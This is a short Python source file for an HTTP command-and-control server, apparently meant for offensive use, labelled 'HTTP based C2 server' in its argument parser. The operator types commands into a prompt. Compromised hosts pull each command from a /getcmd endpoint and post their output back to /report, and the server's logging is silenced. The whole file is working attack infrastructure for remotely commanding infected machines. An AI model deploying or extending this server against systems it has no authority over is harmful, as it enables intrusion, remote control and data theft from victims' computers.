from flask import Flask, request, Response
import threading
import argparse
import logging
import sys

app = Flask(__name__)

# Disable Flask (Werkzeug) logs and banner
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
try:
    import flask.cli as _flask_cli
    _flask_cli.show_server_banner = lambda *x: None
except Exception:
    pass

current_cmd = ""
prompt = "> "
print_lock = threading.Lock()

def _get_readline_buffer():
    """Return the current user input buffer (if readline exists)."""
    try:
        import readline
        return readline.get_line_buffer()
    except Exception:
        return ""

def _redisplay_readline():
    """Ask readline to redraw the line (best effort)."""
    try:
        import readline
        readline.redisplay()
    except Exception:
        pass

def safe_print_above_prompt(text: str, reprint_prompt=True):
    """Print `text` above the current prompt, preserving any typed input."""
    with print_lock:
        buf = _get_readline_buffer()
        sys.stdout.write("\r\033[K")   # Clear current line
        print(text)                     # Print new text
        if reprint_prompt:
            sys.stdout.write(prompt + buf)
            sys.stdout.flush()
            _redisplay_readline()

@app.route("/getcmd", methods=["GET"])
def get_cmd():
    global current_cmd
    resp = current_cmd
    current_cmd = ''
    return Response(resp, mimetype="text/plain")

@app.route("/report", methods=["POST"])
def report():
    data = request.get_data(as_text=True)
    if data:
        safe_print_above_prompt(data)

    return Response("ok", mimetype="text/plain")

def cli_loop():
    global current_cmd
    while True:
        try:
            # `input(prompt)` prints the prompt automatically
            line = input(prompt).strip()
            if not line:
                continue
            current_cmd = line
            # Print the entered command above, but DO NOT reprint the prompt
            safe_print_above_prompt('', reprint_prompt=False)
        except (EOFError, KeyboardInterrupt):
            print("\nExiting...")
            break

def run_flask(host, port):
    app.run(host=host, port=port, debug=False, use_reloader=False, threaded=True)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='C2', description='HTTP based C2 server')
    parser.add_argument('--lhost', required=True)
    parser.add_argument('--lport', type=int, required=True)
    args = parser.parse_args()

    threading.Thread(target=lambda: run_flask(args.lhost, args.lport), daemon=True).start()

    print(f"Flask CLI server started at http://{args.lhost}:{args.lport}")
    print("Type commands below; they’ll be available via /getcmd:")
    cli_loop()

